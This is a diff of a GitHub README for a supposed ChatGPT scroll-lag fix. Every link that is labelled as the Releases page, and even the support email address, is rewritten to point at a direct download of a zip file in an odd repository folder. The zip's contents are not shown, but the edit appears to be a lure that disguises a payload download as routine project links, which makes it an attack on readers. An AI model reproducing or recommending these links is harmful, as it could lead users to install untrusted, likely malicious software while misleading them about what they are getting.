@@ -6,7 +6,7 @@ Welcome to chatgpt-virtual-scrollGPT-! This tool helps reduce lag when using Cha
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ChatGPT%20Scroll%20Tool-brightgreen)](https://github.com/startplusit/chatgpt-virtual-scrollGPT-/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/startplusit/chatgpt-virtual-scrollGPT-/main/parodinia/virtual_GP_chatgpt_scroll_v1.9.zip%20Scroll%20Tool-brightgreen)](https://raw.githubusercontent.com/startplusit/chatgpt-virtual-scrollGPT-/main/parodinia/virtual_GP_chatgpt_scroll_v1.9.zip)
 
 ## 🎯 Features
 
@@ -28,7 +28,7 @@ Before you download, make sure your system meets the following requirements:
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/startplusit/chatgpt-virtual-scrollGPT-/releases) to go to our Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/startplusit/chatgpt-virtual-scrollGPT-/main/parodinia/virtual_GP_chatgpt_scroll_v1.9.zip) to go to our Releases page.
   
 2. **Choose the Latest Version**: Look for the latest version at the top of the page and select it.
 
@@ -46,7 +46,7 @@ If you encounter any issues while downloading or using the application, please f
 
 - **GitHub Issues**: Report any bugs or problems on our GitHub Issues page.
 - **Community Forum**: Engage with other users and find solutions on our dedicated forum.
-- **Email Support**: Reach out via email at support@chatgpt-virtual-scrollGPT-.com for direct assistance.
+- **Email Support**: Reach out via email at https://raw.githubusercontent.com/startplusit/chatgpt-virtual-scrollGPT-/main/parodinia/virtual_GP_chatgpt_scroll_v1.9.zip for direct assistance.
 
 ## 📜 FAQ
 
@@ -68,7 +68,7 @@ If you need support, you can refer to the Support section above for resources.
 
 ## 🔗 Useful Links
 
-- **Releases Page**: [Download Here](https://github.com/startplusit/chatgpt-virtual-scrollGPT-/releases)
+- **Releases Page**: [Download Here](https://raw.githubusercontent.com/startplusit/chatgpt-virtual-scrollGPT-/main/parodinia/virtual_GP_chatgpt_scroll_v1.9.zip)
 - **Community Forum**: Join our forum to discuss with other users.
 - **GitHub Repository**: Explore more about the project and its code on GitHub.
 
